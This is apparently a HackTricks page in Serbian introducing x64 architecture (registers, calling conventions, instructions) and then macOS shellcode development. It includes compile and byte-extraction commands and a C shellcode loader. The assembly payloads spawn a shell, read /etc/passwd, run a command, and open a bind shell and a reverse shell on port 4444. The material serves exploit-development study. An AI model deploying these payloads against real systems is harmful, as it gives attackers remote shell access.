# Увод у x64

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Увод у x64**

x64, познат и као x86-64, је 64-битна архитектура процесора која се превасно користи у десктоп и серверском рачунарству. Потиче из x86 архитектуре коју је произвео Intel, а касније је усвојила AMD под именом AMD64, и данас је преовлађујућа архитектура у личним рачунарима и серверима.

### **Регистри**

x64 се проширује на x86 архитектуру, имајући **16 регистара опште намене** обележених `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, и `r8` до `r15`. Сваки од ових може да чува **64-битну** (8-бајтну) вредност. Ови регистри такође имају 32-битне, 16-битне и 8-битне подрегистре за компатибилност и специфичне задатке.

1. **`rax`** - Традиционално се користи за **вредности повратка** из функција.
2. **`rbx`** - Често се користи као **базни регистар** за операције са меморијом.
3. **`rcx`** - Обично се користи за **бројаче петљи**.
4. **`rdx`** - Користи се у разним улогама укључујући проширене аритметичке операције.
5. **`rbp`** - **Базни показивач** за стек фрејм.
6. **`rsp`** - **Показивач стека**, прати врх стека.
7. **`rsi`** и **`rdi`** - Користе се за **изворне** и **одредишне** индексе у операцијама са низовима/меморијом.
8. **`r8`** до **`r15`** - Додатни регистри опште намене уведени у x64.

### **Конвенција позива**

Конвенција позива x64 варира између оперативних система. На пример:

* **Windows**: Прва **четири параметра** се преносе у регистре **`rcx`**, **`rdx`**, **`r8`**, и **`r9`**. Додатни параметри се стављају на стек. Вредност повратка је у **`rax`**.
* **System V (обично коришћен у UNIX-подобним системима)**: Првих **шест целих или показивачких параметара** се преносе у регистре **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, и **`r9`**. Вредност повратка је такође у **`rax`**.

Ако функција има више од шест улаза, **остали ће бити пренесени на стек**. **RSP**, показивач стека, мора бити **поредио на 16 бајтова**, што значи да адреса на коју указује мора бити делива са 16 пре него што се било који позив деси. То значи да обично морамо осигурати да је RSP правилно поређен у нашем shellcode-у пре него што направимо позив функције. Међутим, у пракси, системски позиви функционишу много пута иако овај захтев није испуњен.

### Конвенција позива у Swift

Swift има своју **конвенцију позива** која се може наћи на [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Уобичајене инструкције**

x64 инструкције имају богат сет, одржавајући компатибилност са ранијим x86 инструкцијама и уводећи нове.

* **`mov`**: **Премести** вредност из једног **регистра** или **меморијске локације** у други.
* Пример: `mov rax, rbx` — Премешта вредност из `rbx` у `rax`.
* **`push`** и **`pop`**: Постави или уклони вредности на/са **стека**.
* Пример: `push rax` — Поставља вредност у `rax` на стек.
* Пример: `pop rax` — Уклоњава врх вредности из стека у `rax`.
* **`add`** и **`sub`**: Операције **сабирања** и **одузимања**.
* Пример: `add rax, rcx` — Сабира вредности у `rax` и `rcx`, чувајући резултат у `rax`.
* **`mul`** и **`div`**: Операције **мултипликације** и **делења**. Напомена: ове имају специфична понашања у вези са коришћењем операнда.
* **`call`** и **`ret`**: Користе се за **позивање** и **враћање из функција**.
* **`int`**: Користи се за активирање софтверског **прекида**. На пример, `int 0x80` се користио за системске позиве у 32-битном x86 Линуксу.
* **`cmp`**: **Упоређује** две вредности и поставља флагове ЦПУ-а на основу резултата.
* Пример: `cmp rax, rdx` — Упоређује `rax` са `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: **Условне скок** инструкције које мењају ток контроле на основу резултата претходне `cmp` или теста.
* Пример: Након инструкције `cmp rax, rdx`, `je label` — Скаче на `label` ако је `rax` једнак `rdx`.
* **`syscall`**: Користи се за **системске позиве** у неким x64 системима (као што је модерни Unix).
* **`sysenter`**: Оптимизована **инструкција системског позива** на неким платформама.

### **Функционални пролог**

1. **Постави стари базни показивач**: `push rbp` (чува базни показивач позиваоца)
2. **Премести тренутни показивач стека у базни показивач**: `mov rbp, rsp` (поставља нови базни показивач за текућу функцију)
3. **Алокирај простор на стеку за локалне променљиве**: `sub rsp, <size>` (где је `<size>` број бајтова који су потребни)

### **Функционални епилог**

1. **Премести тренутни базни показивач у показивач стека**: `mov rsp, rbp` (ослобађа локалне променљиве)
2. **Уклоните стари базни показивач са стека**: `pop rbp` (враћа базни показивач позиваоца)
3. **Врати**: `ret` (враћа контролу позиваоцу)

## macOS

### системски позиви

Постоје различите класе системских позива, можете [**наћи их овде**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Zatim, možete pronaći svaki syscall broj [**na ovoj adresi**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Dakle, da biste pozvali `open` syscall (**5**) iz **Unix/BSD klase**, potrebno je da mu dodate: `0x2000000`

Dakle, broj syscall-a za pozivanje open bi bio `0x2000005`

### Shellcodes

Da biste kompajlirali:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Da biste izdvojili bajtove:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i objašnjeno.

{% tabs %}
{% tab title="sa adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="sa stekom" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Čitajte sa cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Pozovite komandu sa sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell sa [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **portu 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell sa [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
